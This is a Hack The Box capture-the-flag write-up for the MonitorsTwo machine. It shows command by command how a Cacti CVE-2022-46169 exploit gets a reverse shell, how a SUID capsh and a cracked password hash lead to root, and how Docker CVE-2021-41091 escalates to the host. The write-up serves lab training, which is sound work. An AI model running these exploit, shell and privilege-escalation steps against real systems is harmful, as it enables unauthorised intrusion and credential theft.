# HTB - MonitorsTwo

##### Ip: 10.129.228.231
##### Name: MonitorsTwo
##### Rating: Easy

------------------------------------------------

MonitorsTwo.png

#### Enumeration

As always, lets kick things off with an Nmap scan covering all TCP ports. I'm adding the `--min-rate 10000` attribute to speed things along, as well as `-sC` and `-sV` to run basic scripts and enumerate versions:

```
┌──(ryan㉿kali)-[~/HTB/MonitorsTwo]
└─$ sudo nmap -p- --min-rate 10000 -sC -sV 10.129.228.231
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-24 15:33 CDT
Nmap scan report for 10.129.228.231
Host is up (0.070s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Login to Cacti
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.81 seconds
```
Looking at the site we find a Cacti login

htb_monitors2_login.png

Looking for Cacti exploits against version 1.2.22 I find: https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22/tree/main

We can fire the exploit with:

```
┌──(ryan㉿kali)-[~/HTB/MonitorsTwo]
└─$ python CVE-2022-46169.py -u http://10.129.228.231 --LHOST=10.10.14.128 --LPORT=443
Checking...
The target is vulnerable. Exploiting...
Bruteforcing the host_id and local_data_ids
Bruteforce Success!!
```

And catch a shell in what seems to be a docker container:

```
┌──(ryan㉿kali)-[~/HTB/MonitorsTwo]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.128] from (UNKNOWN) [10.129.228.231] 37266
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@50bca5e748b0:/var/www/html$ whoami
whoami
www-data
www-data@50bca5e748b0:/var/www/html$ hostname
hostname
50bca5e748b0
```

Running LinPEAS on the target we find `capsh` has the SUID bit set:

htb_monitors2_lp1.png

We can head to: https://gtfobins.github.io/gtfobins/capsh/#suid for the command we'll need.

htb_monitors2_gtfo.png

Lets give it a shot:

```
www-data@50bca5e748b0:/tmp$ cd /sbin
cd /sbin
www-data@50bca5e748b0:/sbin$ ./capsh --gid=0 --uid=0 --
./capsh --gid=0 --uid=0 --
whoami
root
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
/bin/bash
/usr/bin/script -qc /bin/bash /dev/null
root@50bca5e748b0:/sbin# 

root@50bca5e748b0:/sbin# 
```

Nice, that worked!

Now that we are root we can access config files in `/var/www/html/include` where we discover DB credentials:

```
root@50bca5e748b0:/var/www/html/include# cat config.php
<SNIP>
╔$database_type     = 'mysql';
$database_default  = 'cacti';
$database_hostname = 'db';
$database_username = 'root';
$database_password = 'root';
$database_port     = '3306';
$database_retries  = 5;
$database_ssl      = false;
$database_ssl_key  = '';
$database_ssl_cert = '';
$database_ssl_ca   = '';
$database_persist  = false;
```

Lets login with: `mysql -h db -u root -proot cacti`

Looking around we find a table called `user_auth` which contains a password hash for user marcus: `$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C`

htb_monitors2_db.png

Now that we have this hash we can use hashcat to crack it:

```
┌──(ryan㉿kali)-[~/HTB/MonitorsTwo]
└─$ hashcat hash /usr/share/wordlists/rockyou.txt -m 3200

hashcat (v6.2.6) starting

<SNIP>

$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey
                                                          
Session..........: hashcat
Status...........: Cracked
```

`marcus:funkymonkey`

Lets use these credentials to SSH in as Marcus:

```
┌──(ryan㉿kali)-[~/HTB/MonitorsTwo]
└─$ ssh marcus@10.129.228.231        
marcus@10.129.228.231's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64)
```

We can now access the user.txt flag:


htb_monitors2_user.png

### Privilege Escalation

Browsing the box we find a message in `/var/mail`:

```
Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
```

Looking into these CVEs, we find our target is vulnerable to CVE-2021-41091.

There is a public exploit available for this at: https://github.com/UncleJ4ck/CVE-2021-41091

Which lays out the steps we'll need to take to fully compromise MonitorsTwo.

So let's re-trace our steps and get a root shell back in the docker container:

```
┌──(ryan㉿kali)-[~/HTB/MonitorsTwo]
└─$ nc -lnvp 443 
listening on [any] 443 ...
connect to [10.10.14.188] from (UNKNOWN) [10.129.228.231] 44256
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@50bca5e748b0:/var/www/html$ cd /sbin
cd /sbin
www-data@50bca5e748b0:/sbin$ ./capsh --gid=0 --uid=0 --
./capsh --gid=0 --uid=0 --
whoami
root
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

Then set the SUID on bash:

```
root@50bca5e748b0:/tmp# chmod u+s /bin/bash
```

Next we can copy the exploit and change modes on it in our SSH connection:

```
marcus@monitorstwo:/tmp$ chmod +x exp.sh 
```

We can then run the script:

```
marcus@monitorstwo:/tmp$ chmod +x exp.sh 
marcus@monitorstwo:/tmp$ ./exp.sh 
[!] Vulnerable to CVE-2021-41091
[!] Now connect to your Docker container that is accessible and obtain root access !
[>] After gaining root access execute this command (chmod u+s /bin/bash)

Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes
[!] Available Overlay2 Filesystems:
/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged

[!] Iterating over the available Overlay2 filesystems !
[?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
[x] Could not get root access in '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged'

[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[!] Rooted !
[>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[?] If it didn't spawn a shell go to this path and execute './bin/bash -p'

[!] Spawning Shell
bash-5.1# exit
marcus@monitorstwo:/tmp$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ./bin/bash -p
bash-5.1# whoami
root
bash-5.1# hostname
monitorstwo
```

From here we can grab the final flag:

htb_monitors2_root.png

Thanks for following along!

-Ryan

------------------------------------